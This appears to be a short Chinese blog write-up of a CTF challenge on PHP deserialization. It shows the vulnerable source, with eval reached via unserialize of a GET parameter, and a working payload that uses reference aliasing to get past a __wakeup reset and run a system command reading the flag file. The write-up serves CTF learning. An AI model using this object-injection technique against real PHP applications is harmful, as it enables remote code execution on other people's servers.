---
title: 日穿php反序列化
date: '2024-6-12 21:50'
categories: 渗透测试
description: 从此打穿天下所有的php反序列化waf
cover: 'https://gitee.com/eviden/img/raw/master/33591dfae30e46459108dc785e1217a9.png'
abbrlink: db1d0201
---

> [UUCTF 2022 新生赛\]ez_unser | NSSCTF](https://www.nssctf.cn/problem/3095)

```php
<?php
show_source(__FILE__);

###very___so___easy!!!!
class test{
    public $a;
    public $b;
    public $c;
    public function __construct(){
        $this->a=1;
        $this->b=2;
        $this->c=3;
    }
    public function __wakeup(){
        $this->a='';
    }
    public function __destruct(){
        $this->b=$this->c;
        eval($this->a);
    }
}
$a=$_GET['a'];
if(!preg_match('/test":3/i',$a)){
    die("你输入的不正确！！！搞什么！！");
}
$bbb=unserialize($_GET['a']);
NSSCTF{This_iS_SO_SO_SO_EASY}
```

讨人厌的waf`if(!preg_match('/test":3/i',$a))`,这里写死了反序列化后的成员数量,让你无法绕过wakeup()魔法,必定触发` $this->a='';`然后不能命令执行了.

这样我们选择一手`金蝉脱壳`运用引用赋值,将b和a的引用指向同一个地方,`这样也就能让b和a的值同时变化`,题中只对a的值做变化,而其引用b的地址没变,`进而通过控制c控制b的值然后a和b一个引用`,因此仍然是可以命令执行的.

Payload:

```php
<?php
 class test{
    public $a,$b,$c;
    public function __construct(){
        $this->a=1;
        $this->b=&$this->a;
        $this->c="system('cat /fffffffffflagafag');";
        // $this->b="system('cat /fffffffffflagafag');";
        // $this->c='123';
        
    }
 }
 echo serialize(new test());
 //O:4:"test":4:{s:1:"a";i:1;s:1:"b";R:2;s:1:"c";s:33:"system('cat /fffffffffflagafag');";}
```

----

> 字符串逃逸,伪协议